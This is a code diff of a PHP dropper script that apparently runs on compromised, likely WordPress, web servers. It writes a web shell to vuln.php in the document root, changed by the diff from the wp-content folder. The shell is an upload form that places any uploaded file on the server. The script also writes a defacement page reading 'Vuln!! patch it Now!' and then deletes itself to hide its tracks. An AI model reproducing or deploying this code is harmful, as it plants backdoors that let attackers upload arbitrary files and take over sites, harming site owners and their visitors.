@@ -10,7 +10,7 @@ function http_get($url){
 	curl_close($im);
 }
 $s = '<title>Vuln!! patch it Now!</title><?php echo \'<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">\';echo \'<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>\';if( $_POST["_upl"] == "Upload" ) {if(@copy($_FILES["file"]["tmp_name"], $_FILES["file"]["name"])) { echo "<b>Shell Uploaded ! :)<b><br><br>"; }else { echo "<b>Not uploaded ! </b><br><br>"; }}?>';
-$check = $_SERVER['DOCUMENT_ROOT'] . "/wp-content/vuln.php";
+$check = $_SERVER['DOCUMENT_ROOT'] . "/vuln.php" ;
 $text = $s;
 $open = fopen($check, 'w');
 fwrite($open, $text);
@@ -20,7 +20,6 @@ if(file_exists($check)){
 }else 
   echo "not exits";
 echo "done .\n " ;
-
 $check2 = $_SERVER['DOCUMENT_ROOT'] . "/vuln.htm" ;
 $text2 = 'Vuln!! patch it Now!';
 $open2 = fopen($check2, 'w');
@@ -31,6 +30,5 @@ if(file_exists($check2)){
 }else 
   echo "not exits";
 echo "done .\n " ;
-
 @unlink(__FILE__);
 ?>
